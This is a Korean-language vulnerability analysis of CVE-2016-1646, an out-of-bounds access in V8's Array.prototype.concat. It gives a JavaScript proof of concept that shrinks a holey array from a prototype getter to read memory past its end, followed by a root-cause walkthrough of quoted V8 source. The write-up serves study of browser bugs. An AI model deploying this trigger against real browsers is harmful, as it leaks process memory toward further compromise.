
# CVE-2016-1646 : Array,prototype.concat OOB Access Vulnerability


- Date : 2016.03

자바스크립트 builtin 함수 `Array.protoype.concat`에 Out-of-Bound Access 취약점이 존재한다.

취약 버전 v8 git : https://chromium.googlesource.com/v8/v8.git/+/163a909154febf5498ee60efe0f4aab09be21515/

## Proof-of-Concept

```JS
function gc() {
  tmp = [];
  for (var i = 0; i < 0x100000; i++)
    tmp.push(new Uint8Array(10));
  tmp = null;
}

b = new Array(10);
b[0] = 0.1; <-- Note that b[1] is a hole!
b[2] = 2.1;
b[3] = 3.1;
b[4] = 4.1;
b[5] = 5.1;
b[6] = 6.1;
b[7] = 7.1;
b[8] = 8.1;
b[9] = 9.1;
b[10] = 10.1;

Object.defineProperty(b.__proto__, 1, { <-- define b.__proto__[1] to gain the control in the middle of the loop
	get: function () {
		b.length = 1; <-- shorten the array
		gc(); <-- shrink the memory
		return 1;
	},
	set: function(new_value){
        /* some business logic goes here */
        value = new_value
    }
});

c = b.concat();
for (var i = 0; i < c.length; i++)
{
    document.write(c[i]);
    document.write("<br>");
}
```

## Root Cause Analysis

Google Chrome v8의 `IterateElements`(src/builtin.cc:997) 함수에 취약점이 존재한다. `IterateElements` native 함수는 주어진 `Array`의 element를 순차적으로 방문하여 `visitor`의 메소드(`visitor->visit`)를 호출하는 함수로서, 방문한 element의 종류에 따라(`GetElementsKind()`) 다음과 같이 `switch` 구문((src/builtin.cc:1025)을 실행한다. 여기서 문제가 되는 case는 `FAST_HOLEY_ELEMENTS`와 `FAST_HOLEY_DOUBLE_ELEMENTS`에 해당한다.

```C++
bool IterateElements(Isolate* isolate, Handle<JSReceiver> receiver,
                     ArrayConcatVisitor* visitor) {

                [...]

  switch (array->GetElementsKind()) {
    case FAST_SMI_ELEMENTS:
    case FAST_ELEMENTS:
    case FAST_HOLEY_SMI_ELEMENTS:
    case FAST_HOLEY_ELEMENTS: {
      // Run through the elements FixedArray and use HasElement and GetElement
      // to check the prototype for missing elements.
      Handle<FixedArray> elements(FixedArray::cast(array->elements()));
      int fast_length = static_cast<int>(length);
      DCHECK(fast_length <= elements->length());
      for (int j = 0; j < fast_length; j++) {
        HandleScope loop_scope(isolate);
        Handle<Object> element_value(elements->get(j), isolate);
        if (!element_value->IsTheHole()) {
          visitor->visit(j, element_value);
        } else {
          Maybe<bool> maybe = JSReceiver::HasElement(array, j);
          if (!maybe.IsJust()) return false;
          if (maybe.FromJust()) {
            // Call GetElement on array, not its prototype, or getters won't
            // have the correct receiver.
            ASSIGN_RETURN_ON_EXCEPTION_VALUE(
                isolate, element_value, Object::GetElement(isolate, array, j),
                false);
            visitor->visit(j, element_value);
          }
        }
      }
      break;
    }
    case FAST_HOLEY_DOUBLE_ELEMENTS:
    case FAST_DOUBLE_ELEMENTS: {
      // Empty array is FixedArray but not FixedDoubleArray.
      if (length == 0) break;
      // Run through the elements FixedArray and use HasElement and GetElement
      // to check the prototype for missing elements.
      if (array->elements()->IsFixedArray()) {
        DCHECK(array->elements()->length() == 0);
        break;
      }
      Handle<FixedDoubleArray> elements(
          FixedDoubleArray::cast(array->elements()));
      int fast_length = static_cast<int>(length);
      DCHECK(fast_length <= elements->length());
      for (int j = 0; j < fast_length; j++) {
        HandleScope loop_scope(isolate);
        if (!elements->is_the_hole(j)) {
          double double_value = elements->get_scalar(j);
          Handle<Object> element_value =
              isolate->factory()->NewNumber(double_value);
          visitor->visit(j, element_value);
        } else {
          Maybe<bool> maybe = JSReceiver::HasElement(array, j);
          if (!maybe.IsJust()) return false;
          if (maybe.FromJust()) {
            // Call GetElement on array, not its prototype, or getters won't
            // have the correct receiver.
            Handle<Object> element_value;
            ASSIGN_RETURN_ON_EXCEPTION_VALUE(
                isolate, element_value, Object::GetElement(isolate, array, j),
                false);
            visitor->visit(j, element_value);
          }
        }
      }
      break;
    }

                [...]

  if (visitor.exceeds_array_limit()) {
    THROW_NEW_ERROR_RETURN_FAILURE(
        isolate, NewRangeError(MessageTemplate::kInvalidArrayLength));
  }
  return *visitor.ToArray();
}
```

위 코드의 `FAST_HOLEY_ELEMENTS` case 문은 `fast_lengh`를 먼저 얻어낸 상태에서, `for` 구문을 통해 `fast_lengh`만큼 반복문을 실행한다. 여기서 중요한 개념은 "hole"인데, hole은 array에서 특정 인덱스의 값이 비어있는 경우를 뜻한다. 예를 들어, PoC 코드의 다음 부분은 Array에 hole이 존재하는 경우를 보여주고 있다(아래 PoC에서 사용한 case는 `FAST_HOLEY_DOUBLE_ELEMENTS`로서, 이 경우 또한 같은 문제를 공유한다)`.

```JS
b = new Array(10);
b[0] = 0.1; <-- Note that b[1] is a hole!
b[2] = 2.1;
b[3] = 3.1;
b[4] = 4.1;
b[5] = 5.1;
b[6] = 6.1;
b[7] = 7.1;
b[8] = 8.1;
b[9] = 9.1;
b[10] = 10.1;
```

위와 같이, `Array`에 hole이 존재할 경우, ```Object::GetElement``` 함수가 실행되고, 이는 곧 index `j`의 `__proto__` 오브젝트에 등록된 getter 함수가 실행됨을 의미한다. 즉, PoC의 다음 코드 부분에 해당한다.

```JS
Object.defineProperty(b.__proto__, 1, {
	get: function () {
        // Do some stuff
		return;
	}
});
```

이렇게 실행되는 getter 함수 내에서 임의로 `Array`의 크기를 줄이면(주어진 `fast_lengh`보다 작게), 이후 계속 수행되는 반복문은 `elements->get(j)` 구문을 실행시킨다. 이때 `elements->get(j)`에 해당하는 native 함수는 `FixedArray::get(int index)`(src/objects-inl.h:2362)이다.

```C++
Object* FixedArray::get(int index) const {
  SLOW_DCHECK(index >= 0 && index < this->length());
  return READ_FIELD(this, kHeaderSize + index * kPointerSize);
}
```

위와 같이, `FixedArray::get` 함수는 현재 접근하는 index의 bound 검사를 하지 않기 때문에(`SLOW_DCHECK`), getter 함수로 인해 작아진 `Array`의 크기로 인해 Out-of-Bound access가 가능해지게 된다.


--- 

## Appendix

- `bool IterateElements(Isolate* isolate, Handle<JSReceiver> receiver, ArrayConcatVisitor* visitor)`
```C++
/**
 * A helper function that visits "array" elements of a JSReceiver in numerical
 * order.
 *
 * The visitor argument called for each existing element in the array
 * with the element index and the element's value.
 * Afterwards it increments the base-index of the visitor by the array
 * length.
 * Returns false if any access threw an exception, otherwise true.
 */
bool IterateElements(Isolate* isolate, Handle<JSReceiver> receiver,
                     ArrayConcatVisitor* visitor) {
  uint32_t length = 0;
  if (receiver->IsJSArray()) {
    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
    length = static_cast<uint32_t>(array->length()->Number());
  } else {
    Handle<Object> val;
    Handle<Object> key = isolate->factory()->length_string();
    ASSIGN_RETURN_ON_EXCEPTION_VALUE(
        isolate, val, Runtime::GetObjectProperty(isolate, receiver, key),
        false);
    ASSIGN_RETURN_ON_EXCEPTION_VALUE(isolate, val,
                                     Object::ToLength(isolate, val), false);
    // TODO(caitp): Support larger element indexes (up to 2^53-1).
    if (!val->ToUint32(&length)) {
      length = 0;
    }
  }
  if (!(receiver->IsJSArray() || receiver->IsJSTypedArray())) {
    // For classes which are not known to be safe to access via elements alone,
    // use the slow case.
    return IterateElementsSlow(isolate, receiver, length, visitor);
  }
  Handle<JSObject> array = Handle<JSObject>::cast(receiver);
  switch (array->GetElementsKind()) {
    case FAST_SMI_ELEMENTS:
    case FAST_ELEMENTS:
    case FAST_HOLEY_SMI_ELEMENTS:
    case FAST_HOLEY_ELEMENTS: {
      // Run through the elements FixedArray and use HasElement and GetElement
      // to check the prototype for missing elements.
      Handle<FixedArray> elements(FixedArray::cast(array->elements()));
      int fast_length = static_cast<int>(length);
      DCHECK(fast_length <= elements->length());
      for (int j = 0; j < fast_length; j++) {
        HandleScope loop_scope(isolate);
        Handle<Object> element_value(elements->get(j), isolate);
        if (!element_value->IsTheHole()) {
          visitor->visit(j, element_value);
        } else {
          Maybe<bool> maybe = JSReceiver::HasElement(array, j);
          if (!maybe.IsJust()) return false;
          if (maybe.FromJust()) {
            // Call GetElement on array, not its prototype, or getters won't
            // have the correct receiver.
            ASSIGN_RETURN_ON_EXCEPTION_VALUE(
                isolate, element_value, Object::GetElement(isolate, array, j),
                false);
            visitor->visit(j, element_value);
          }
        }
      }
      break;
    }
    case FAST_HOLEY_DOUBLE_ELEMENTS:
    case FAST_DOUBLE_ELEMENTS: {
      // Empty array is FixedArray but not FixedDoubleArray.
      if (length == 0) break;
      // Run through the elements FixedArray and use HasElement and GetElement
      // to check the prototype for missing elements.
      if (array->elements()->IsFixedArray()) {
        DCHECK(array->elements()->length() == 0);
        break;
      }
      Handle<FixedDoubleArray> elements(
          FixedDoubleArray::cast(array->elements()));
      int fast_length = static_cast<int>(length);
      DCHECK(fast_length <= elements->length());
      for (int j = 0; j < fast_length; j++) {
        HandleScope loop_scope(isolate);
        if (!elements->is_the_hole(j)) {
          double double_value = elements->get_scalar(j);
          Handle<Object> element_value =
              isolate->factory()->NewNumber(double_value);
          visitor->visit(j, element_value);
        } else {
          Maybe<bool> maybe = JSReceiver::HasElement(array, j);
          if (!maybe.IsJust()) return false;
          if (maybe.FromJust()) {
            // Call GetElement on array, not its prototype, or getters won't
            // have the correct receiver.
            Handle<Object> element_value;
            ASSIGN_RETURN_ON_EXCEPTION_VALUE(
                isolate, element_value, Object::GetElement(isolate, array, j),
                false);
            visitor->visit(j, element_value);
          }
        }
      }
      break;
    }
    case DICTIONARY_ELEMENTS: {
      // CollectElementIndices() can't be called when there's a JSProxy
      // on the prototype chain.
      for (PrototypeIterator iter(isolate, array); !iter.IsAtEnd();
           iter.Advance()) {
        if (PrototypeIterator::GetCurrent(iter)->IsJSProxy()) {
          return IterateElementsSlow(isolate, array, length, visitor);
        }
      }
      Handle<SeededNumberDictionary> dict(array->element_dictionary());
      List<uint32_t> indices(dict->Capacity() / 2);
      // Collect all indices in the object and the prototypes less
      // than length. This might introduce duplicates in the indices list.
      CollectElementIndices(array, length, &indices);
      indices.Sort(&compareUInt32);
      int j = 0;
      int n = indices.length();
      while (j < n) {
        HandleScope loop_scope(isolate);
        uint32_t index = indices[j];
        Handle<Object> element;
        ASSIGN_RETURN_ON_EXCEPTION_VALUE(
            isolate, element, Object::GetElement(isolate, array, index), false);
        visitor->visit(index, element);
        // Skip to next different index (i.e., omit duplicates).
        do {
          j++;
        } while (j < n && indices[j] == index);
      }
      break;
    }
    case UINT8_CLAMPED_ELEMENTS: {
      Handle<FixedUint8ClampedArray> pixels(
          FixedUint8ClampedArray::cast(array->elements()));
      for (uint32_t j = 0; j < length; j++) {
        Handle<Smi> e(Smi::FromInt(pixels->get_scalar(j)), isolate);
        visitor->visit(j, e);
      }
      break;
    }
    case INT8_ELEMENTS: {
      IterateTypedArrayElements<FixedInt8Array, int8_t>(isolate, array, true,
                                                        true, visitor);
      break;
    }
    case UINT8_ELEMENTS: {
      IterateTypedArrayElements<FixedUint8Array, uint8_t>(isolate, array, true,
                                                          true, visitor);
      break;
    }
    case INT16_ELEMENTS: {
      IterateTypedArrayElements<FixedInt16Array, int16_t>(isolate, array, true,
                                                          true, visitor);
      break;
    }
    case UINT16_ELEMENTS: {
      IterateTypedArrayElements<FixedUint16Array, uint16_t>(
          isolate, array, true, true, visitor);
      break;
    }
    case INT32_ELEMENTS: {
      IterateTypedArrayElements<FixedInt32Array, int32_t>(isolate, array, true,
                                                          false, visitor);
      break;
    }
    case UINT32_ELEMENTS: {
      IterateTypedArrayElements<FixedUint32Array, uint32_t>(
          isolate, array, true, false, visitor);
      break;
    }
    case FLOAT32_ELEMENTS: {
      IterateTypedArrayElements<FixedFloat32Array, float>(isolate, array, false,
                                                          false, visitor);
      break;
    }
    case FLOAT64_ELEMENTS: {
      IterateTypedArrayElements<FixedFloat64Array, double>(
          isolate, array, false, false, visitor);
      break;
    }
    case FAST_SLOPPY_ARGUMENTS_ELEMENTS:
    case SLOW_SLOPPY_ARGUMENTS_ELEMENTS: {
      for (uint32_t index = 0; index < length; index++) {
        HandleScope loop_scope(isolate);
        Handle<Object> element;
        ASSIGN_RETURN_ON_EXCEPTION_VALUE(
            isolate, element, Object::GetElement(isolate, array, index), false);
        visitor->visit(index, element);
      }
      break;
    }
  }
  visitor->increase_index_offset(length);
  return true;
}

```




## 


